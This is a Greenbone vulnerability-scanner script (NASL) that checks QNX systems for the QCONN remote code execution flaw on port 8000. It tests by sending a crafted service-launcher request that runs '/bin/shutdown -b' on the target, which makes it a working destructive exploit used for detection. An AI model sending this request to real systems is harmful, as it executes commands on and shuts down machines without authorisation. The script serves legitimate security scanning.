# SPDX-FileCopyrightText: 2012 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.802461");
  script_version("2024-06-27T05:05:29+0000");
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_tag(name:"last_modification", value:"2024-06-27 05:05:29 +0000 (Thu, 27 Jun 2024)");
  script_tag(name:"creation_date", value:"2012-09-26 13:12:00 +0530 (Wed, 26 Sep 2012)");
  script_name("QNX QCONN RCE Vulnerability");
  script_category(ACT_DENIAL);
  script_copyright("Copyright (C) 2012 Greenbone AG");
  script_family("General");
  script_dependencies("find_service.nasl");
  script_require_ports(8000);

  script_xref(name:"URL", value:"http://1337day.com/exploits/1946");
  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/21520/");
  script_xref(name:"URL", value:"http://packetstormsecurity.org/files/116877/QNX-QCONN-Remote-Command-Execution.html");

  script_tag(name:"impact", value:"Successful exploitation may allow remote attackers to execute
  arbitrary code or cause a denial of service condition and compromise the system.");
  script_tag(name:"affected", value:"QNX version 6.5.0 and prior");
  script_tag(name:"insight", value:"The flaw is due to error in 'QCONN' when handling the crafted
  requests. This can be exploited to execute arbitrary code  via a specially
  crafted packet sent to port 8000.");
  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
  release, disable respective features, remove the product or replace the product by another one.");
  script_tag(name:"summary", value:"QNX RTOS is prone to a remote code execution (RCE) vulnerability.");

  script_tag(name:"qod_type", value:"remote_analysis");
  script_tag(name:"solution_type", value:"WillNotFix");

  exit(0);
}

## Default Port
port = 8000;
if(!get_port_state(port)){
  exit(0);
}

soc = open_sock_tcp(port);
if(!soc){
  exit(0);
}

res = recv(socket:soc, length:1024);
if("QCONN" >!< res)
{
  close(soc);
  exit(0);
}

req = string("service launcher\n",
             "start/flags ", port, " /bin/shutdown /bin/shutdown -b\n",
             "continue\n");

## Sending constructed request
send(socket:soc, data:req);
close(soc);

sleep(3);

if(soc =  open_sock_tcp(port))
{
  res = recv(socket:soc, length:1024);
  if("QCONN" >!< res)
  {
   close(soc);
   security_message(port);
   exit(0);
  }
}

else{
  security_message(port);
}
